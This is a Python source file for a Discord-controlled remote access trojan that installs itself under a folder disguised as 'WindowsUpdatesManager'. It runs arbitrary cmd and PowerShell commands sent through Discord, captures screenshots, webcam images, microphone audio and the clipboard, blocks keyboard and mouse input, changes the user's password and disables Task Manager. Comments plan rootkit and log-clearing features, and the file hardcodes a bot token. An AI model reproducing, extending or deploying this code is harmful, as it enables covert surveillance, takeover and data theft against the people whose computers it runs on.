import os, json, discord, time, threading, pynput, pyperclip, threading, tracemalloc, pyaudio, opuslib, winreg
import modules.pc as pc
from PIL import ImageGrab

#IDEAS:
#   Anti VM (low priority)
#   Rootkit (med-high pr)

#HOURS WASTED ON AUDIO STREAM: 3

class Variables:
    def __init__(self):
        #t = os.getenv("TOKEN").split("MMM")
        #self.token = t[0]
        self.snky_dir = f"{os.getenv('LOCALAPPDATA')}\\WindowsUpdatesManager"

        if os.path.exists(f"{self.snky_dir}\\cfg.json"):
            with open(f"{self.snky_dir}\\cfg.json", "r") as f:
                self.cfg = json.load(f)
        else:
            self.cfg = {
                "prefix": "!"
            }

            with open(f"{self.snky_dir}\\cfg.json", "w") as f:
                json.dump(self.cfg, f, indent=4)

        self.debug_programs = ["Taskmgr.exe", "procexp64.exe", "procexp.exe", "procmon64.exe", "procmon.exe", "wireshark.exe", "fiddler.exe", "tcpview.exe", "autoruns.exe", "mmc.exe"] #Still no admin privileges :((((


# Global variables for voice and video thread and voice client
voice_and_video_thread = None
voice_client = None
tracemalloc.start()

# This stupid ass thing is wasting my precious time and reducing my brain cells to zero. I thank the Discord devs for this incerdible piece of shit c:

# Function to handle voice and video in a separate thread
def capture_audio_and_play(voice_client, channel):

    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024

    # Initialize PyAudio
    audio = pyaudio.PyAudio()

    # Open microphone stream
    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    channel = client.get_channel(int(1225850739071647876))
    
    while True:
        data = stream.read(CHUNK)
        # Convert audio data to Opus format
        opus_data = opuslib.Encoder(RATE, CHANNELS, opuslib.APPLICATION_AUDIO).encode(data)
        voice_client.send_audio_packet(opus_data)
        

async def start_audio(message, voice_client):
    if message.author.voice:
        channel = message.author.voice.channel
        voice_client = await channel.connect()
        threading.Thread(target=capture_audio_and_play, args=(voice_client, channel), daemon=True).start()
    else:
        await message.send("You need to be in a voice channel to use this command.")

#Requires admin privileges :(

#def clear_logs():
#    while True: 
#        #os.popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}")
#       si = subprocess.STARTUPINFO()
#       si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
#       subprocess.Popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}", shell=False, startupinfo=si) #Nope
#       time.sleep(1)


intents = discord.Intents.all()
variables = Variables()

client = discord.Client(intents=intents)

#Suppress => blocks input (:D)
keyboard_listener = pynput.keyboard.Listener(suppress=True)
mouse_listener = pynput.mouse.Listener(suppress=True) 

@client.event
async def on_ready():
    pass

@client.event
async def on_message(message, ):
    if message.author.bot:
        return

    #HELP MESSAGE
    if message.content.startswith(f"{variables.cfg['prefix']}help"):
        embed = discord.Embed(title="Help", color=0x00ff00)
        embed.add_field(name="!help", value="Shows this message", inline=False)
        embed.add_field(name="!hostinfo", value="Shows host information", inline=False)
        embed.add_field(name="!ipconfig", value="Shows IP configuration", inline=False)
        embed.add_field(name="!tasklist", value="Shows task list", inline=False)

        await message.channel.send(embed=embed)

    #HOSTINFO - systeminfo cmd
    if message.content.startswith(f"{variables.cfg['prefix']}hostinfo"):
        embed = discord.Embed(title="Host Info", description="Host information gathered.", color=0x00ff00)

        result = pc.hostinfo(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\hostinfo.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\hostinfo.txt")
        except:
            pass

    #IPCONFIG - ipconfig cmd
    if message.content.startswith(f"{variables.cfg['prefix']}ipconfig"):
        embed = discord.Embed(title="IP Config", description="IP config gathered.", color=0x00ff00)

        result = pc.ipconfig(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\ipconfig.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\ipconfig.txt")
        except:
            pass

    #TASKLIST - tasklist cmd
    if message.content.startswith(f"{variables.cfg['prefix']}tasklist"):
        embed = discord.Embed(title="Task List", description="Task list gathered.", color=0x00ff00)

        result = pc.tasklist(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\tasklist.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\tasklist.txt")
        except:
            pass

    #HARDWARE INFO
    if message.content.startswith(f"{variables.cfg['prefix']}hwinfo"):
        embed = discord.Embed(title="Hardware Info", description="Hardware information gathered.", color=0x00ff00)

        result = pc.hwinfo(variables.snky_dir)

        while not os.path.exists(f"{variables.snky_dir}\\hwinfo.txt"):
            time.sleep(2)

        try:
            await message.channel.send(embed=embed, file=discord.File(result))
            time.sleep(0.3)
            os.remove(f"{variables.snky_dir}\\hwinfo.txt")
        except:
            pass
        
    #CHANGE PASSWORD
    if message.content.startswith(f"{variables.cfg['prefix']}changepassword"):
        args = message.content.split(" ")
        if len(args) == 1:
            embed = discord.Embed(title="Change password", description="Usage: !changepass <new_password>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        try:
            os.popen(f"net user {os.getlogin()} {args[1]}")
            embed = discord.Embed(title="Change password", description="Password changed.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Change password", description="Error changing password.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #LOGOUT
    if message.content.startswith(f"{variables.cfg['prefix']}logout"):
        embed = discord.Embed(title="Logout", description="Logging out...", color=0x00ff00)
        
        await message.channel.send(embed=embed)
        os.popen("shutdown /l")

    #SHUTDOWN
    if message.content.startswith(f"{variables.cfg['prefix']}shutdown"):
        embed = discord.Embed(title="Shutdown", description="Shutting down...", color=0x00ff00)

        await message.channel.send(embed=embed)
        os.popen("shutdown /s /t 0")

    #LIST DIR
    if message.content.startswith(f"{variables.cfg['prefix']}ls"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="List directory", description="Usage: !ls <dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        try:
            files = os.listdir(args[1])
            files = "\n".join(files)
            embed = discord.Embed(title="List directory", description="Files listed.", color=0x00ff00)
            await message.channel.send(embed=embed)
            await message.channel.send(f"```{files}```")
        except:
            embed = discord.Embed(title="List directory", description="Error listing directory.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #DELETE FILE
    if message.content.startswith(f"{variables.cfg['prefix']}del"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Delete", description="Usage: !del <file>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.remove(args[1])
            embed = discord.Embed(title="Delete", description=f"File {args[1]} deleted.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Delete", description="Error deleting file.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #TASKKILL
    if message.content.startswith(f"{variables.cfg['prefix']}taskkill"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Taskkill", description="Usage: !taskkill <pid>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.popen(f"taskkill /PID {args[1]} /F")
            await message.channel.send(f"Killed ```{args[1]}```")
        except:
            embed = discord.Embed(title="Taskkill", description="Error killing task. Make sure the PID is correct or the file is not elevated.", color=0x00ff00)
            await message.channel.send(embed=embed) #No admin privileges :(
            
    #OPEN FILE
    if message.content.startswith(f"{variables.cfg['prefix']}open"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Open", description="Usage: !open <file>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.startfile(args[1])
            embed = discord.Embed(title="Open", description=f"Opened {args[1]}", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            await message.channel.send("Error opening file.")

    #UPLOAD FILE
    if message.content.startswith(f"{variables.cfg['prefix']}upload"):
        if len(message.attachments) == 0:
            embed = discord.Embed(title="Upload", description="No file attached.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        attachment = message.attachments[0]

        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Upload", description="Usage: !upload <path>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        
        await attachment.save(f"{args[1]}\\{attachment.filename}")
        
        embed = discord.Embed(title="Upload", description=f"Uploaded {attachment.filename}", color=0x00ff00)
        await message.channel.send(embed=embed)

    #DOWNLOAD FILE
    if message.content.startswith(f"{variables.cfg['prefix']}download"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Download", description="Usage: !download <file>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            embed = discord.Embed(title="Download", description="File downloaded.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Download", description=f"Error downloading file\n{Exception}", color=0x00ff00)
            await message.channel.send(embed=embed)

    #SCREENSHOT
    if message.content.startswith(f"{variables.cfg['prefix']}screenshot"):
        embed = discord.Embed(title="Screenshot", description="Taking screenshot...", color=0x00ff00)

        await message.channel.send(embed=embed)
        
        ImageGrab.grab().save(f"{variables.snky_dir}\\screenshot.png")

        while not os.path.exists(f"{variables.snky_dir}\\screenshot.png"):
            time.sleep(1)
        
        try:
            await message.channel.send(file=discord.File(f"{variables.snky_dir}\\screenshot.png"))
            os.remove(f"{variables.snky_dir}\\screenshot.png")
        except:
            pass

    #CAM IMG - FIX THIS [[ERROR:0@1.593] global obsensor_uvc_stream_channel.cpp:159 cv::obsensor::getStreamChannelGroup Camera index out of range]
    if message.content.startswith(f"{variables.cfg['prefix']}cam"):
        embed = discord.Embed(title="Cam", description="Taking cam image...", color=0x00ff00)

        await message.channel.send(embed=embed)

        returned = pc.cam_img(variables.snky_dir)

        if not returned:
            await message.channel.send("No camera found.")
            return

        while not os.path.exists(f"{variables.snky_dir}\\cam.jpg"):
            time.sleep(1)

        try:
            await message.channel.send(file=discord.File(f"{variables.snky_dir}\\cam.jpg"))
            os.remove(f"{variables.snky_dir}\\cam.jpg")
        except:
            pass
    
    #CREATE DIR
    if message.content.startswith(f"{variables.cfg['prefix']}mkdir"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Mkdir", description="Usage: !mkdir <dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.mkdir(args[1])
            embed = discord.Embed(title="Mkdir", description=f"Created {args[1]}", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Mkdir", description="Error creating directory.", color=0x00ff00)
            await message.channel.send(embed=embed)
    
    #DELETE DIR
    if message.content.startswith(f"{variables.cfg['prefix']}rmdir"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Rmdir", description="Usage: !rmdir <dir>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            os.rmdir(args[1])
            embed = discord.Embed(title="Rmdir", description=f"Deleted {args[1]}", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="Rmdir", description="Error deleting directory.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #BLOCK INPUT
    if message.content.startswith(f"{variables.cfg['prefix']}blockinput"):
        keyboard_listener.start()
        mouse_listener.start()

        embed = discord.Embed(title="Block Input", description="Input blocked.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #UNBLOCK INPUT
    if message.content.startswith(f"{variables.cfg['prefix']}unblockinput"):
        keyboard_listener.stop()
        mouse_listener.stop()

        embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #CLIPBOARD
    if message.content.startswith(f"{variables.cfg['prefix']}clipboard"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Clipboard", description="Usage: !clipboard <set/get> <text>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        
        if len(args) == 2 and args[1] != "get":
            embed = discord.Embed(title="Clipboard", description="Usage: !clipboard <set/get> <if SET, then text>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        if args[1] == "set":
            try:
                pyperclip.copy(args[2])
                embed = discord.Embed(title="Clipboard", description="Text copied to clipboard.", color=0x00ff00)
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(title="Clipboard", description="Error copying text to clipboard.", color=0x00ff00)
                await message.channel.send(embed=embed)
        elif args[1] == "get":
            try:
                text = pyperclip.paste()
                embed = discord.Embed(title="Clipboard", description=f"Text in clipboard: {text}", color=0x00ff00)
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(title="Clipboard", description="Error getting text from clipboard. Text might be too long or empty.", color=0x00ff00)
                await message.channel.send(embed=embed)

    #MONITOR CONTROL
    if message.content.startswith(f"{variables.cfg['prefix']}monitor"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Monitor", description="Usage: !monitor <on/off>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        if args[1] == "on":
            pc.monitor("on")
            embed = discord.Embed(title="Monitor", description="Monitor turned on.", color=0x00ff00)
            await message.channel.send(embed=embed)
        elif args[1] == "off":
            pc.monitor("off")
            embed = discord.Embed(title="Monitor", description="Monitor turned off.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #CMD EXEC
    if message.content.startswith(f"{variables.cfg['prefix']}cmd"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="CMD", description="Usage: !cmd <command>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            result = os.popen(" ".join(args[1:])).read()
            embed = discord.Embed(title="CMD", description=f"```{result}```", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="CMD", description="Error executing command.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #POWERSHELL EXEC
    if message.content.startswith(f"{variables.cfg['prefix']}ps"):
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="PS", description="Usage: !ps <command>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        try:
            result = os.popen(f"powershell {args[1]}").read()
            embed = discord.Embed(title="PS", description=f"```{result}```", color=0x00ff00)
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(title="PS", description="Error executing command.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #VOICE AND VIDEO STREAM
    if message.content.startswith(f"{variables.cfg['prefix']}stream"):
        global capture_and_play_audio, voice_client
        args = message.content.split(" ")

        if len(args) == 1:
            embed = discord.Embed(title="Stream", description="Usage: !stream <start/stop>", color=0x00ff00)
            await message.channel.send(embed=embed)
            return

        if args[1] == "start":

            if message.author.voice:
                await start_audio(message, voice_client)
                
            else:
                await message.send("You need to be in a voice channel to use this command.")
        if args[1] == "stop":
            #global voice_client, voice_and_video_thread
            if voice_client:
                await voice_client.disconnect()
                voice_client = None
                if capture_and_play_audio and capture_and_play_audio.is_alive():
                    capture_and_play_audio.join()
            else:
                await message.send("I'm not in a voice channel.")

    #DISABLE TM
    if message.content.startswith(f"{variables.cfg['prefix']}distm"):
        embed = discord.Embed(title="Disable TM", description="Disabling Task Manager...", color=0x00ff00)

        await message.channel.send(embed=embed)
        registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry_name = "DisableTaskMgr"
        value = 1
        
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(reg_key)
            return True
        except WindowsError as e:
            return e
        
    #ENABLE TM
    if message.content.startswith(f"{variables.cfg['prefix']}entm"):
        embed = discord.Embed(title="Enable TM", description="Enabling Task Manager...", color=0x00ff00)

        await message.channel.send(embed=embed)
        registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry_name = "DisableTaskMgr"
        value = 0
        
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(reg_key)
            return True
        except WindowsError as e:
            return e
        

#client.run(variables.token)
client.run("MTIyNTc5MTM4NjM2NDgwOTI1Ng.GgyZrr.lfp7eiYfTFxlNA4KIWTuR4vgCyJEgapPpA97Yc")
